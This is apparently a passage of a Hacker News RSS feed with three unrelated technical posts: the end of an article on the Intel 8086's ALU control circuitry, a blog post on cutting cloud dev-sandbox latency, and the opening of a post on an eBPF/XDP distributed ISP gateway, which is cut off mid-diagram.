    &lt;p&gt;The ALU is the heart of a processor, performing arithmetic and logic operations. Microprocessors of the 1970s typically supported addition and subtraction; logical AND, OR, and XOR; and various bit shift operations. (Although the 8086 had multiply and divide instructions, these were implemented in microcode, not in the ALU.) Since an ALU is both large and critical to performance, chip architects try to optimize its design. As a result, different microprocessors have widely different ALU designs. For instance, the 6502 microprocessor has separate circuits for addition and each logic operation; a multiplexer selects the appropriate output. The Intel 8085, on the other hand, uses an optimized clump of gates that performs the desired operation based on control signals (details), while the Z80's 4-bit CPU uses a different clump of gates (details).&lt;/p&gt;
    &lt;p&gt;The 8086 takes a different approach, using two lookup tables (along with other gates) to generate the carry and output signals for each bit in the ALU. By setting the lookup tables appropriately, the ALU can be configured to perform the desired operation. (This is similar to how an FPGA implements arbitrary functions through lookup tables.) The schematic below shows the circuit for one bit of the ALU. I won't explain this circuit in detail since I explained it in an earlier article.3 The relevant part of this circuit is the six control signals at the left. The two multiplexers (trapezoidal symbols) implement the lookup tables by using the two input argument bits to select outputs from the control signals to control carry generation and carry propagation. Thus, by feeding appropriate control signals into the ALU, the 8086 can reconfigure the ALU to perform the desired operation. For instance, with one set of control signals, this circuit will add. Other sets of control signals will cause the circuit to subtract or compute a logical operation, such as AND or XOR. The 8086 has 16 copies of this circuit, so it operates on 16-bit values.&lt;/p&gt;
    &lt;p&gt;The 8086 is a complicated processor, and its instructions have many special cases, so controlling the ALU is more complex than described above. For instance, the compare operation is the same as a subtraction, except the numerical result of a compare is discarded; just the status flags are updated. The add versus add-with-carry instructions require different values for the carry into bit 0, while subtraction requires the carry flag to be inverted since it is treated as a borrow. The 8086's ALU supports increment and decrement operations, but also increment and decrement by 2, which requires an increment signal into bit 1 instead of bit 0. The bit-shift operations all require special treatment. For instance, a rotate can use the carry bit or exclude the carry bit, while and arithmetic shift right requires the top bit to be duplicated. As a result, along with the six lookup table (LUT) control signals, the ALU also requires numerous control signals to adjust its behavior for specific instructions. In the next section, I'll explain how these control signals are generated.&lt;/p&gt;
    &lt;head rend="h2"&gt;ALU control circuitry on the die&lt;/head&gt;
    &lt;p&gt;The diagram below shows the components of the ALU control logic as they appear on the die. The information from the micro-instruction enters at the right and is stored in the latches. The PLAs (Programmable Logic Arrays) decode the instruction and generate the control signals. These signals flow to the left, where they control the ALU.&lt;/p&gt;
    &lt;p&gt;As explained earlier, if the microcode specifies the &lt;code&gt;XI&lt;/code&gt; operation, the operation field is replaced with a value based on the machine instruction opcode.
This substitution is performed by the &lt;code&gt;XI&lt;/code&gt; multiplexer before the value is stored in the operation latch.
Because of the complexity of the 8086 instruction set, the &lt;code&gt;XI&lt;/code&gt; operation is not as straightforward as you might expect.
This multiplexer gets three instruction bits from a special register called the "X" register, another instruction bit from the instruction
register, and the final bit from a decoding circuit called the Group Decode ROM.4&lt;/p&gt;
    &lt;p&gt;Recall that one micro-instruction specifies the ALU operation, and a later micro-instruction accesses the result. Thus, the ALU control circuitry must remember the specified operation so it can be used later. In particular, the control circuitry must keep track of the ALU operation to perform and the temporary register specified. The control circuitry uses three flip-flops to keep track of the specified temporary register, one flip-flop for each register. The micro-instruction contains a two-bit field that specifies the temporary register. The control circuitry decodes this field and activates the associated flip-flop. The outputs from these flip-flops go to the ALU and enable the associated temporary register. At the start of each machine instruction,5 the flip-flops are reset, so temporary register A is selected by default.&lt;/p&gt;
    &lt;p&gt;The control circuitry uses five flip-flops to store the five-bit operation field from the micro-instruction. At the start of each machine instruction, the flip-flops are reset so operation 0 (ADD) is specified by default. One important consequence is that an add operation can potentially be performed without a micro-instruction to configure the ALU, shortening the microcode by one micro-instruction and thus shortening the instruction time by one cycle.&lt;/p&gt;
    &lt;p&gt;The five-bit output from the operation flip-flops goes to the operation PLA (Programmable Logic Array)7, which decodes the operation into 27 control signals.6 Many of these signals go to the ALU, where they control the behavior of the ALU for special cases. About 15 of these signals go to the Lookup Table (LUT) PLA, which generates the six lookup table signals for the ALU. At the left side of the LUT PLA, special high-current driver circuits amplify the control signals before they are sent to the ALU. Details on these drivers are in the footnotes.8&lt;/p&gt;
    &lt;head rend="h2"&gt;Conclusions&lt;/head&gt;
    &lt;p&gt;Whenever I look at the circuitry of the 8086 processor, I see the differences between a RISC chip and a CISC chip. In a RISC (Reduced Instruction Set Computer) processor such as ARM, instruction decoding is straightforward, as is the processor circuitry. But in the 8086, a CISC (Complex Instruction Set Computer) processor, there are corner cases and complications everywhere. For instance, an 8086 machine instruction sometimes specifies the ALU operation in the first byte and sometimes in the second byte, and sometimes elsewhere, so the X register latch, the XI multiplexer, and the Group Decode ROM are needed. The 8086's ALU includes obscure operations including four types of BCD adjustments and seven types of shifts, making the ALU more complicated. Of course, the continuing success of x86 shows that this complexity also has benefits.&lt;/p&gt;
    &lt;p&gt;This article has been a deep dive into the details of the 8086's ALU, but I hope you have found it interesting. If it's too much detail for you, you might prefer my overview of the 8086 ALU.&lt;/p&gt;
    &lt;p&gt;For updates, follow me on Bluesky (@righto.com), Mastodon (@[email protected]), or RSS.&lt;/p&gt;
    &lt;p&gt;Credits: Thanks to Marcin Peczarski for discussion. My microcode analysis is based on Andrew Jenner's 8086 microcode disassembly.&lt;/p&gt;
    &lt;head rend="h2"&gt;Notes and references&lt;/head&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;The operations implemented by the ALU are:&lt;/p&gt;
        &lt;td&gt;00&lt;/td&gt;
        &lt;td&gt;ADD&lt;/td&gt;
        &lt;td&gt;Add&lt;/td&gt;
        &lt;td&gt;01&lt;/td&gt;
        &lt;td&gt;OR&lt;/td&gt;
        &lt;td&gt;Logical OR&lt;/td&gt;
        &lt;td&gt;02&lt;/td&gt;
        &lt;td&gt;ADC&lt;/td&gt;
        &lt;td&gt;Add with carry in&lt;/td&gt;
        &lt;td&gt;03&lt;/td&gt;
        &lt;td&gt;SBB&lt;/td&gt;
        &lt;td&gt;Subtract with borrow in&lt;/td&gt;
        &lt;td&gt;04&lt;/td&gt;
        &lt;td&gt;AND&lt;/td&gt;
        &lt;td&gt;Logical AND&lt;/td&gt;
        &lt;td&gt;05&lt;/td&gt;
        &lt;td&gt;SUBT&lt;/td&gt;
        &lt;td&gt;Subtract&lt;/td&gt;
        &lt;td&gt;06&lt;/td&gt;
        &lt;td&gt;XOR&lt;/td&gt;
        &lt;td&gt;Logical XOR&lt;/td&gt;
        &lt;td&gt;07&lt;/td&gt;
        &lt;td&gt;CMP&lt;/td&gt;
        &lt;td&gt;Comparison&lt;/td&gt;
        &lt;td&gt;08&lt;/td&gt;
        &lt;td&gt;ROL&lt;/td&gt;
        &lt;td&gt;Rotate left&lt;/td&gt;
        &lt;td&gt;09&lt;/td&gt;
        &lt;td&gt;ROR&lt;/td&gt;
        &lt;td&gt;Rotate right&lt;/td&gt;
        &lt;td&gt;0a&lt;/td&gt;
        &lt;td&gt;LRCY&lt;/td&gt;
        &lt;td&gt;Left rotate through carry&lt;/td&gt;
        &lt;td&gt;0b&lt;/td&gt;
        &lt;td&gt;RRCY&lt;/td&gt;
        &lt;td&gt;Right rotate through carry&lt;/td&gt;
        &lt;td&gt;0c&lt;/td&gt;
        &lt;td&gt;SHL&lt;/td&gt;
        &lt;td&gt;Shift left&lt;/td&gt;
        &lt;td&gt;0d&lt;/td&gt;
        &lt;td&gt;SHR&lt;/td&gt;
        &lt;td&gt;Shift right&lt;/td&gt;
        &lt;td&gt;0e&lt;/td&gt;
        &lt;td&gt;SETMO&lt;/td&gt;
        &lt;td&gt;Set to minus one (questionable)&lt;/td&gt;
        &lt;td&gt;0f&lt;/td&gt;
        &lt;td&gt;SAR&lt;/td&gt;
        &lt;td&gt;Arithmetic shift right&lt;/td&gt;
        &lt;td&gt;10&lt;/td&gt;
        &lt;td&gt;PASS&lt;/td&gt;
        &lt;td&gt;Pass argument unchanged&lt;/td&gt;
        &lt;td&gt;11&lt;/td&gt;
        &lt;td&gt;XI&lt;/td&gt;
        &lt;td&gt;Instruction specifies ALU op&lt;/td&gt;
        &lt;td&gt;14&lt;/td&gt;
        &lt;td&gt;DAA&lt;/td&gt;
        &lt;td&gt;Decimal adjust after addition&lt;/td&gt;
        &lt;td&gt;15&lt;/td&gt;
        &lt;td&gt;DAS&lt;/td&gt;
        &lt;td&gt;Decimal adjust after subtraction&lt;/td&gt;
        &lt;td&gt;16&lt;/td&gt;
        &lt;td&gt;AAA&lt;/td&gt;
        &lt;td&gt;ASCII adjust after addition&lt;/td&gt;
        &lt;td&gt;17&lt;/td&gt;
        &lt;td&gt;AAS&lt;/td&gt;
        &lt;td&gt;ASCII adjust after subtraction&lt;/td&gt;
        &lt;td&gt;18&lt;/td&gt;
        &lt;td&gt;INC&lt;/td&gt;
        &lt;td&gt;Increment&lt;/td&gt;
        &lt;td&gt;19&lt;/td&gt;
        &lt;td&gt;DEC&lt;/td&gt;
        &lt;td&gt;Decrement&lt;/td&gt;
        &lt;td&gt;1a&lt;/td&gt;
        &lt;td&gt;COM1&lt;/td&gt;
        &lt;td&gt;1's complement&lt;/td&gt;
        &lt;td&gt;1b&lt;/td&gt;
        &lt;td&gt;NEG&lt;/td&gt;
        &lt;td&gt;Negate&lt;/td&gt;
        &lt;td&gt;1c&lt;/td&gt;
        &lt;td&gt;INC2&lt;/td&gt;
        &lt;td&gt;Increment by 2&lt;/td&gt;
        &lt;td&gt;1d&lt;/td&gt;
        &lt;td&gt;DEC2&lt;/td&gt;
        &lt;td&gt;Decrement by 2&lt;/td&gt;
      &lt;/item&gt;
      &lt;item&gt;&lt;p&gt;You might wonder how this microcode handles the 8086's complicated addressing modes such as&lt;/p&gt;&lt;code&gt;[BX+DI]&lt;/code&gt;. The trick is that microcode subroutines implement the addressing modes. For details, see my article on 8086 addressing microcode. ↩&lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The 8086's ALU has a separate circuit to implement shift-right. The problem is that data in an ALU normally flows right-to-left as carries flow from lower bits to higher bits. Shifting data to the right goes against this direction, so it requires a special path. (Shifting to the left is straightforward; you can add a number to itself.)&lt;/p&gt;
        &lt;p&gt;The adjust operations (DAA, DAS, AAA, AAS) also use completely separate circuitry. These operations generate correction factors for BCD (binary-coded decimal) arithmetic based on the value and flags. The circuitry for these operations is located with the flags circuitry, separate from the rest of the ALU circuitry. ↩&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;In more detail, the 8086 stores bits 5-3 of the machine instruction in the "X" register. For an XI operation, the X register bits become bits 2-0 of the ALU operation specification, while bit 3 comes from bit 6 of the instruction, and bit 4 comes from the Group Decode ROM for certain instructions. The point of this is that the instruction set is designed so bits of the instruction correspond to bits of the ALU operation specifier, but the mapping is more complicated than you might expect. The eight basic arithmetic/logic operations (ADD, SUB, OR, etc) have a straightforward mapping that is visible from the 8086 opcode table, but the mapping for other instructions isn't as obvious. Moreover, sometimes the operation is specified in the first byte of the machine instruction, but sometimes it is specified in the second byte, which is why the X register needs to store the relevant bits. ↩&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;The flip-flops are reset by a signal in the 8086, called "Second Clock". When a new machine instruction is started, the "First Clock" signal is generated on the instruction's first byte and the "Second Clock" signal is generated on the instruction's second byte. (Note that these signals are not necessarily on consecutive clock cycles, because a memory fetch may be required if the instruction queue is empty.) Why are the flip-flops reset on Second Clock and not First Clock? The 8086 has a small degree of pipelining, so the previous micro-instruction may still be finishing up during First Clock of the next instruction. By Second Clock, it is safe to reset the ALU state. ↩&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;&lt;p&gt;For reference, the 27 outputs from the PLA are triggered by the following ALU micro-operations:&lt;/p&gt;&lt;p&gt;Output 0: RRCY (right rotate through carry)&lt;/p&gt;&lt;lb/&gt;Output 1: ROR (Rotate Right)&lt;lb/&gt;Output 2: BCD Adjustments: DAA (Decimal Adjust after Addition), DAS (Decimal Adjust after Subtraction), AAA (ASCII Adjust after Subtraction), or AAS (ASCII Adjust after Subtraction)&lt;lb/&gt;Output 3: SAR (Shift Arithmetic Right)&lt;lb/&gt;Output 4: Left shift: ROL (Rotate Left), RCL (Rotate through Carry Left), SHL (Shift Left), or SETMO (Set Minus One)&lt;lb/&gt;Output 5: Right shift: ROR (Rotate Right), RCR (Rotate through Carry Right), SHR (Shift Right), or SAR (Shift Arithmetic Right)&lt;lb/&gt;Output 6: INC2 (increment by 2)&lt;lb/&gt;Output 7: ROL (Rotate Left)&lt;lb/&gt;Output 8: RCL (Rotate through Carry Left)&lt;lb/&gt;Output 9: ADC (add with carry)&lt;lb/&gt;Output 10: DEC2 (decrement by 2)&lt;lb/&gt;Output 11: INC (increment)&lt;lb/&gt;Output 12: NEG (negate)&lt;lb/&gt;Output 13: ALU operation 12 (unused?)&lt;lb/&gt;Output 14: SUB (Subtract), CMP (Compare), DAS (Decimal Adjust after Subtraction), AAS (ASCII Adjust after Subtraction)&lt;lb/&gt;Output 15: SBB (Subtract with Borrow)&lt;lb/&gt;Output 16: ROL (Rotate Left) or RCL (Rotate through Carry Left)&lt;lb/&gt;Output 17: ADD or ADC (Add with Carry)&lt;lb/&gt;Output 18: DEC or DEC2 (Decrement by 1 or 2)&lt;lb/&gt;Output 19: PASS (pass-through) or INC (Increment)&lt;lb/&gt;Output 20: COM1 (1's Complement) or NEG (Negate)&lt;lb/&gt;Output 21: XOR&lt;lb/&gt;Output 22: OR&lt;lb/&gt;Output 23: AND&lt;lb/&gt;Output 24: SHL (Shift Left)&lt;lb/&gt;Output 25: DAA or AAA (Decimal/ASCII Adjust after Addition)&lt;lb/&gt;Output 26: CMP (Compare) ↩&lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;A Programmable Logic Array is a way of implementing logic gates in a structured grid. PLAs are often used in microprocessors because they provide a dense way of implementing logic. A PLA normally consists of two layers: an "OR" layer and an "AND" layer. Together, the layers produce "sum-of-products" outputs, consisting of multiple terms OR'd together. The ALU's PLA is a bit unusual because many outputs are taken directly from the OR layer, while only about 15 outputs from the first layer are fed into the second layer. ↩&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;&lt;p&gt;The control signals pass through the driver circuit below. The operation of this circuit puzzled me for years, since the transistor with its gate at +5V seems to be stuck on. But I was looking at the book DRAM Circuit Design and spotted the same circuit, called the "Bootstrap Wordline Driver". The purpose of this circuit is to boost the output to a higher voltage than a regular NMOS circuit, providing better performance. The problem with NMOS circuitry is that NMOS transistors aren't very good at pulling a signal high: due to the properties of the transistor, the output voltage is less than the gate voltage, lower by the threshold voltage VTH, half a volt or more.&lt;/p&gt;The drive signals to the ALU gates are generated with this dynamic circuit.&lt;p&gt;The bootstrap circuit takes advantage of capacitance to get more voltage out of the circuit. Specifically, suppose the input is +5V, while the clock is high. Point A will be about 4.5V, losing half a volt due to the threshold. Now, suppose the clock goes low, so the inverted clock driving the upper transistor goes high. Due to capacitance in the second transistor, as the source and drain go high, the gate will be pulled above its previous voltage, maybe gaining a couple of volts. The high voltage on the gate produces a full-voltage output, avoiding the drop due to VTH. But why the transistor with its gate at +5V? This transistor acts somewhat like a diode, preventing the boosted voltage from flowing backward through the input and dissipating.&lt;/p&gt;&lt;p&gt;The bootstrap circuit is used on the ALU's lookup table control signals for two reasons. First, these control signals drive pass transistors. A pass transistor suffers from a voltage drop due to the threshold voltage, so you want to start with a control signal with as high a voltage as possible. Second, each control signal is connected to 16 transistors (one for each bit). This is a large number of transistors to drive from one signal, since each transistor has gate capacitance. Increasing the voltage helps overcome the R-C (resistor-capacitor) delay, improving performance.&lt;/p&gt;A close-up of the bootstrap drive circuits, in the left half of the LUT PLA.&lt;p&gt;The diagram above shows six bootstrap drivers on the die. At the left are the transistors that ground the signals when clock is high. The +5V transistors are scattered around the image; two of them are labeled. The six large transistors provide the output signal, controlled by clock'. Note that these transistors are much larger than the other transistors because they must produce the high-current output, while the other transistors have more of a supporting role.&lt;/p&gt;&lt;p&gt;(Bootstrap circuits go way back; Federico Faggin designed a bootstrap circuit for the Intel 8008 that he claimed "proved essential to the microprocessor realization.") ↩&lt;/p&gt;&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46735133</guid><pubDate>Fri, 23 Jan 2026 17:26:27 +0000</pubDate></item><item><title>Nobody likes lag: How to make low-latency dev sandboxes</title><link>https://www.compyle.ai/blog/nobody-likes-lag/</link><description>&lt;doc fingerprint="e48ae1da68a8cacf"&gt;
  &lt;main&gt;
    &lt;p&gt;Nobody likes lag, especially not developers. When you type a character in a terminal or editor, you expect it to appear instantly. At Compyle, we spin up ephemeral cloud dev environments where an agent and a user share an IDE + terminal. So how can we make a remote sandbox feel local?&lt;/p&gt;
    &lt;p&gt;TL;DR: If you want low latency sandboxes, cut out the middlemen and put your servers next to your users.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Naive Approach&lt;/head&gt;
    &lt;p&gt;Here is what our initial architecture looked like:&lt;/p&gt;
    &lt;p&gt;The flow would be something like:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;User starts task&lt;/item&gt;
      &lt;item&gt;We provision a new sandbox in our primary region&lt;/item&gt;
      &lt;item&gt;We communicate with the agent through a socket server that handles authorization, routing requests to the correct sandbox, and persisting any messages the agent sends (we don’t want to give the sandbox any credentials).&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;There are three main concerns with running a coding agent sandbox.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Startup time&lt;/item&gt;
      &lt;item&gt;Latency&lt;/item&gt;
      &lt;item&gt;Security&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I can confidently say that this architecture does pretty poorly on the first two categories. Here’s the scorecard:&lt;/p&gt;
    &lt;head rend="h3"&gt;Startup time: bad (10-30 seconds)&lt;/head&gt;
    &lt;p&gt;While many sandbox companies advertise sub-second cold starts, this simply wasn’t the case for us. Our dockerfile is a few hundred megabytes and we attach an encrypted volume to each machine. In practice, machines took 10 seconds to start in the best case, and 30 seconds in the worst. That said, now is a good time to mention that we use fly.io for our sandboxes, and love it. More on this later.&lt;/p&gt;
    &lt;p&gt;With this approach, users are staring at a loading screen for 30 seconds before the agent’s first message would appear. Yikes.&lt;/p&gt;
    &lt;head rend="h3"&gt;Latency: also bad (&amp;gt;200ms)&lt;/head&gt;
    &lt;p&gt;We had two glaring issues on the latency front:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Every request makes an extra network hop. Worse yet, for websocket connections we were stitching the client connection to the agent connection in the socket server, which had some overhead.&lt;/item&gt;
      &lt;item&gt;Persistence was on the hot path between the agent and the client, so that extra network hop caused additional latency from any database queries done.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;For the agent messages, an extra 150ms isn’t the end of the world because LLM calls make up the lion’s share of the gap between messages. The real issue is in the terminal and the IDE. It was about a 200ms lag between hitting a key and seeing the character in the terminal. Genuinely unbearable. Same for opening a file in the IDE.&lt;/p&gt;
    &lt;head rend="h3"&gt;Security: it’s fine&lt;/head&gt;
    &lt;p&gt;The agent wasn’t exposed to the public internet and doesn’t have any secrets. I’ll save security details for another time, though.&lt;/p&gt;
    &lt;p&gt;The point here is that this architecture does poorly on two of our three concerns; it’s painfully slow.&lt;/p&gt;
    &lt;head rend="h2"&gt;Fixing startup time: the warm pool&lt;/head&gt;
    &lt;p&gt;The startup time is pretty easy to fix. Rather than provision a new machine every time someone requests one, we can keep a warm pool. Now, a pool of machines sit at the ready, so every time a user starts a task, we simply send an http request to start the task.&lt;/p&gt;
    &lt;p&gt;Great! No more cold starts, so startup time goes from 30s → 50ms&lt;/p&gt;
    &lt;p&gt;This does not solve the latency issue, though.&lt;/p&gt;
    &lt;head rend="h2"&gt;Cutting out the middleman (and why I love fly.io)&lt;/head&gt;
    &lt;p&gt;To remove that extra network hop, here’s the new architecture we went with:&lt;/p&gt;
    &lt;p&gt;Spoiler, this change was the biggest win performance wise, but also the biggest lift technically because our socket server had so many responsibilities:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Authorization&lt;/item&gt;
      &lt;item&gt;Billing and persistence for agent messages&lt;/item&gt;
      &lt;item&gt;Routing requests to the correct machine&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Each of these had to be addressed separately.&lt;/p&gt;
    &lt;head rend="h3"&gt;Authorization&lt;/head&gt;
    &lt;p&gt;Originally, we were authenticating users on the socket server, so each request made a database query. Since we are connecting directly to the machines now, a better approach is to create a JWT when the task is created, send it to the machine and the client, let the client connect directly to the machine. If the machine’s token doesn’t match, it’s an unauthorized request.&lt;/p&gt;
    &lt;head rend="h3"&gt;Billing and persistence&lt;/head&gt;
    &lt;p&gt;Originally, we would bill users on each request going through the socket server, and send an interrupt back to the agent if the user was out of credits. We have an LLM router that receives all of the same messages, so we moved the responsibility there, and let it return a 402 for the agent to handle when the user is out of credits. For message persistence, by making the agent the source of truth for messages, we could also accommodate the database’s message records only being eventually consistent. We batch process them in a separate queue worker so we don’t hammer the database.&lt;/p&gt;
    &lt;head rend="h3"&gt;Routing requests&lt;/head&gt;
    &lt;p&gt;Originally, our sandbox urls were formatted like &lt;code&gt;&amp;lt;task_id&amp;gt;.machine.compyle.ai&lt;/code&gt;. We would do another database lookup to find the correct machine and use fly.io’s private network addresses to route the request by machine id from the socket server.&lt;/p&gt;
    &lt;p&gt;We switched the domain to use &lt;code&gt;&amp;lt;machine_id&amp;gt;.sandbox.compyle.ai&lt;/code&gt; and adopted fly.io’s clever proxying mechanism, fly replay. Fly replay is a cool trick that allows servers to respond to http requests with a 307 and &lt;code&gt;fly-replay&lt;/code&gt; header to signal fly’s network to bounce the request to the machine specified in the header. Crucially, Fly can cache that behavior so that the bounce only happens once. You can read more about it here.&lt;/p&gt;
    &lt;p&gt;At this point, the terminals and IDE were super fast for me, but I live in San Francisco, right by the data center in San Jose. For a user on the East coast (or elsewhere in the world), it was a different story. This is what the latency of a user typing &lt;code&gt;ls -lsa&lt;/code&gt; into their terminal from Virginia would look like:&lt;/p&gt;
    &lt;p&gt;That’s an average 79ms roundtrip, and we can do better.&lt;/p&gt;
    &lt;head rend="h2"&gt;Multi-regional pool&lt;/head&gt;
    &lt;p&gt;If I’m in San Francisco, and I get the benefit of working on machines in San Jose, then why shouldn’t our users? The last unlock was moving our sandboxes to the closest region to our users. We still have to keep a warm pool, so instead of keeping one warm pool in San Jose, we now keep separate pools across the US, Europe, and Asia.&lt;/p&gt;
    &lt;p&gt;Here’s our architecture now:&lt;/p&gt;
    &lt;p&gt;And here’s what the latency looks like for a user typing &lt;code&gt;ls -lsa&lt;/code&gt; into the terminal of a nearby sandbox:&lt;/p&gt;
    &lt;p&gt;That’s an average 14ms and that’s pretty good.&lt;/p&gt;
    &lt;head rend="h2"&gt;Final Results&lt;/head&gt;
    &lt;p&gt;Reducing terminal roundtrip time from &amp;gt;200ms to 14ms feels great, but real lesson here is a familiar one: simple solutions are best. Our final architecture has less infrastructure than our initial architecture. The biggest speedup came from deleting the socket servers and the code that lived on them. If you want to improve performance it’s often best to look for what you can remove.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46735139</guid><pubDate>Fri, 23 Jan 2026 17:26:57 +0000</pubDate></item><item><title>Killing the ISP Appliance: An eBPF/XDP Approach to Distributed BNG</title><link>https://markgascoyne.co.uk/posts/ebpf-bng/</link><description>&lt;doc fingerprint="bd5a3910e1c27e71"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Killing the ISP Appliance: An eBPF/XDP Approach to Distributed BNG&lt;/head&gt;
    &lt;p&gt;I used to work for an ISP startup that was building next-generation infrastructure. The company didn’t make it, but the problems we were trying to solve stuck with me. So I spent a few weeks building what we never got to: an open-source, eBPF-accelerated BNG that runs directly on OLT hardware.&lt;/p&gt;
    &lt;p&gt;This post explains the architecture and why I think it’s the future of ISP edge infrastructure.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Problem: Centralised BNG is a Bottleneck&lt;/head&gt;
    &lt;p&gt;Traditional ISP architecture looks like this:&lt;/p&gt;
    &lt;code&gt;Customer → ONT → OLT → [BNG Appliance] → Internet
                            ↑
               Single point of failure
               Expensive proprietary hardware
               All subscriber traffic flows through here
&lt;/code&gt;
    &lt;p&gt;Every subscriber’s traffic - DHCP, authentication, NAT, QoS - flows through a central BNG appliance. These boxes cost six figures, require vendor support contracts, and create a single point of failure. When they go down, everyone goes down.&lt;/p&gt;
    &lt;p&gt;The industry’s answer has been to buy bigger boxes with more redundancy. But what if we flipped the model entirely?&lt;/p&gt;
    &lt;head rend="h2"&gt;The Idea: Distribute the BNG to the Edge&lt;/head&gt;
    &lt;p&gt;What if, instead of funneling all traffic through a central appliance, we ran BNG functions directly on the OLT hardware at each edge site?&lt;/p&gt;
    &lt;code&gt;Customer → ONT → OLT(+BNG) → Internet
                    ↑
       Subscriber traffic stays LOCAL
       No central bottleneck
       Each site operates independently
&lt;/code&gt;
    &lt;p&gt;This isn’t a new idea - it’s essentially what hyperscalers do with their edge infrastructure. But ISPs have been slow to adopt it because:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Traditional BNG software assumes a central deployment&lt;/item&gt;
      &lt;item&gt;State management (IP allocations, sessions) is hard to distribute&lt;/item&gt;
      &lt;item&gt;Performance requirements seemed to need specialised hardware&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The key insight is that modern Linux with eBPF/XDP can handle ISP-scale packet processing on commodity hardware.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why eBPF/XDP, Not VPP?&lt;/head&gt;
    &lt;p&gt;When I started this project, I evaluated two approaches:&lt;/p&gt;
    &lt;p&gt;VPP (Vector Packet Processing) - The industry darling for high-performance networking. Used in production by big telcos. Handles 100+ Gbps easily.&lt;/p&gt;
    &lt;p&gt;eBPF/XDP - Linux kernel’s programmable packet processing. Lower peak throughput, but much simpler operations.&lt;/p&gt;
    &lt;p&gt;For edge deployment (10-40 Gbps per OLT), I chose eBPF/XDP:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Aspect&lt;/cell&gt;
        &lt;cell role="head"&gt;eBPF/XDP&lt;/cell&gt;
        &lt;cell role="head"&gt;VPP&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Performance&lt;/cell&gt;
        &lt;cell&gt;10-40 Gbps ✓&lt;/cell&gt;
        &lt;cell&gt;100+ Gbps (overkill)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Deployment&lt;/cell&gt;
        &lt;cell&gt;Standard Linux kernel&lt;/cell&gt;
        &lt;cell&gt;DPDK, hugepages, dedicated NICs&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Operations&lt;/cell&gt;
        &lt;cell&gt;systemd service&lt;/cell&gt;
        &lt;cell&gt;Complex dedicated setup&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Debugging&lt;/cell&gt;
        &lt;cell&gt;tcpdump, bpftool, perf&lt;/cell&gt;
        &lt;cell&gt;Custom tools&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Learning curve&lt;/cell&gt;
        &lt;cell&gt;Steep but well-documented&lt;/cell&gt;
        &lt;cell&gt;Very steep, less documentation&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;VPP is the right choice for core aggregation. But for edge sites? eBPF/XDP is simpler and sufficient.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Architecture&lt;/head&gt;
    &lt;p&gt;Here’s what I built:&lt;/p&gt;
    &lt;code&gt;┌─────────────────────────────────────────────────────────────┐
│  CENTRAL (Kubernetes)                                        │
│  Nexus: CRDT state sync, hashring IP allocation             │
│  (Control plane only - NO subscriber traffic)               │
└──────────────────────────┬──────────────────────────────────┘
                           │ Config sync, metrics
         ┌─────────────────┼─────────────────┐
         ▼                 ▼                 ▼
   ┌───────────┐     ┌───────────┐     ┌───────────┐
   │ OLT-BNG 1 │     │ OLT-BNG 2 │     │ OLT-BNG N │
   │ eBPF/XDP  │     │ eBPF/XDP  │     │ eBPF/XDP  │
   │ 1500 subs │     │ 2000 subs │     │ 1800 subs │
   └─────┬─────┘     └─────┬─────┘     └─────┬─────┘
         │                 │                 │
    Traffic LOCAL     Traffic LOCAL     Traffic LOCAL
         ↓                 ↓                 ↓
       ISP PE           ISP PE           ISP PE
&lt;/code&gt;
    &lt;p&gt;Key principle: Subscriber traffic never touches central infrastructure. The central Nexus server only handles control plane operations - config distribution, IP allocation coordination, monitoring.&lt;/p&gt;
    &lt;head rend="h3"&gt;Two-Tier DHCP: Fast Path + Slow Path&lt;/head&gt;
    &lt;p&gt;The performance-critical insight is that most DHCP operations are renewals from known subscribers. We can handle these entirely in the kernel:&lt;/p&gt;
    &lt;code&gt;DHCP Request arrives
        │
        ▼
┌───────────────────────────────────────────────────────┐
│               XDP Fast Path (Kernel)                   │
│                                                        │
│  1. Parse Ethernet → IP → UDP → DHCP                  │
│  2. Extract client MAC                                 │
│  3. Lookup MAC in eBPF subscriber_pools map           │
│                                                        │
│  CACHE HIT?                                           │
│  ├─ YES: Generate DHCP ACK in kernel                  │
│  │       Return XDP_TX (~10μs latency)                │
│  └─ NO:  Return XDP_PASS → userspace                  │
└───────────────────────────────────────────────────────┘
        │ XDP_PASS (cache miss)
        ▼
┌───────────────────────────────────────────────────────┐
